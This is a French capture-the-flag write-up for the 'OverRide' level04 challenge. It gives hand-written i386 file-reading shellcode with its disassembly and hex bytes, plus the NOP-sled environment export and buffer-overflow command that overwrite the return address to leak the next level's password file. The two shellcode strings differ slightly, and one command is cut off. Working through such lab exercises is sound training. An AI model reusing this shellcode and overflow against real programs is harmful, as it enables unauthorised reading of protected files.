# Level04

Nous remarquons la presence d'un fork, qui nous empeche de garde la main avec un simple shellcode.
Nous devons realiser notre propre shellcode file reader architecture i386,
il fera un open, read et write sur le fichier .pass du level suivant.

Le code asm est disponnible dans le fichier shell.s dans le dossier resources.

Ensuite nous recuperons sont code en hexa grace a obj dump.

```
level04@OverRide:/tmp/test$ objdump -d shellcode

shellcode:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c9                	xor    %ecx,%ecx
 8048062:	f7 e1                	mul    %ecx

08048064 <open>:
 8048064:	b0 05                	mov    $0x5,%al
 8048066:	51                   	push   %ecx
 8048067:	68 70 61 73 73       	push   $0x73736170
 804806c:	68 30 34 2f 2e       	push   $0x2e2f3430
 8048071:	68 65 76 65 6c       	push   $0x6c657665
 8048076:	68 72 73 2f 6c       	push   $0x6c2f7372
 804807b:	68 2f 75 73 65       	push   $0x6573752f
 8048080:	68 68 6f 6d 65       	push   $0x656d6f68
 8048085:	68 2f 2f 00 00       	push   $0x2f2f
 804808a:	89 e3                	mov    %esp,%ebx
 804808c:	cd 80                	int    $0x80

0804808e <read>:
 804808e:	93                   	xchg   %eax,%ebx
 804808f:	91                   	xchg   %eax,%ecx
 8048090:	b0 03                	mov    $0x3,%al
 8048092:	66 ba ff 0f          	mov    $0xfff,%dx
 8048096:	42                   	inc    %edx
 8048097:	cd 80                	int    $0x80

08048099 <write>:
 8048099:	92                   	xchg   %eax,%edx
 804809a:	b3 01                	mov    $0x1,%bl
 804809c:	c1 e8 0a             	shr    $0xa,%eax
 804809f:	cd 80                	int    $0x80

080480a1 <exit>:
 80480a1:	93                   	xchg   %eax,%ebx
 80480a2:	cd 80                	int    $0x80
```

Ce qui nous donne :
```
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x70\x61\x73\x73\x68\x30\x34\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x00\x00\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80"
```

level04@OverRide:~$ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80"^C
level04@OverRide:~$ python -c 'print "B" * 156 + "\xb0\xd8\xff\xff"' | ./level04
